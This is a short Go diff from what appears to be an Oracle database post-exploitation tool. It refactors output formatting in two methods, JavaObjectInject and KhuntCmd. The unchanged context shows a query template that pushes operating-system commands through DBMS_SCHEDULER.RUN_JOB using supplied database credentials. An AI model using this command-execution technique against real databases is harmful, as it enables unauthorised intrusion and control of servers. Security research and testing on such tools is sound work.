@@ -31,10 +31,10 @@ func (o *OracleExploit) JavaObjectInject(creds *DBCreds, result *PostExploitResu
 	for _, query := range queries {
 		resp, err := o.executeQuery(creds, query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("Error: %v\n", err))
+			fmt.Fprintf(&output, "Error: %v\n", err)
 			continue
 		}
-		output.WriteString(fmt.Sprintf("Query: %s\nResult: %s\n\n", query, resp))
+		fmt.Fprintf(&output, "Query: %s\nResult: %s\n\n", query, resp)
 	}
 
 	if output.Len() > 0 {
@@ -60,10 +60,10 @@ func (o *OracleExploit) KhuntCmd(creds *DBCreds, result *PostExploitResult) (*Po
 		query := fmt.Sprintf(`SELECT DBMS_SCHEDULER.RUN_JOB('KHUNT_CMD:%s') FROM dual`, cmd)
 		resp, err := o.executeQuery(creds, query)
 		if err != nil {
-			output.WriteString(fmt.Sprintf("Error executing %s: %v\n", cmd, err))
+			fmt.Fprintf(&output, "Error executing %s: %v\n", cmd, err)
 			continue
 		}
-		output.WriteString(fmt.Sprintf("=== %s ===\n%s\n\n", cmd, resp))
+		fmt.Fprintf(&output, "=== %s ===\n%s\n\n", cmd, resp)
 	}
 
 	if output.Len() > 0 {
